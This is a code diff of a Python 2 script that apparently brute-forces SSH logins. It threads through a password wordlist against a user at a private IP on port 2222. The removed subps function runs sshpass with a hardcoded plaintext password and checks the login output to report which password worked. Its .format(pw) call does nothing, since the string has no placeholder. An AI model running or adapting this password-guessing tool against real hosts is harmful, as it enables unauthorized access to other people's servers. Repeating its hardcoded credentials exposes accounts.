@@ -2,13 +2,10 @@
 
 # coding=utf-8
 
-import subprocess
 import threading
 import commands
-import time
 from subprocess import PIPE, Popen
 
-p = 1
 USERNAME = "sigurdkb"
 IP_ADRESS = "172.16.0.30"
 PORT = "2222"
@@ -44,9 +41,6 @@ def connect_ssh():
                 print new_results
 
 
-
-
-
 def get_next_pw():
     global counter
     global counter_loop
@@ -69,20 +63,6 @@ def main():
     t1.join()
     t2.join()
 
-
-
-def subps():
-    pw = get_next_pw()
-    cmd = 'sshpass -p bkdrugis ssh Sigurdkb@10.225.147.156 -p 2222'.format(pw)
-
-    output, err = Popen(cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
-    print "Output" + output, err
-
-    if not b"Permission denied, please try again." in output:
-        print "Det gikk: " + pw
-
-    else:
-        print "Feil passord: " + pw
 
 # Optional function to split wordlist into multiple wordlists.
 def split_file():
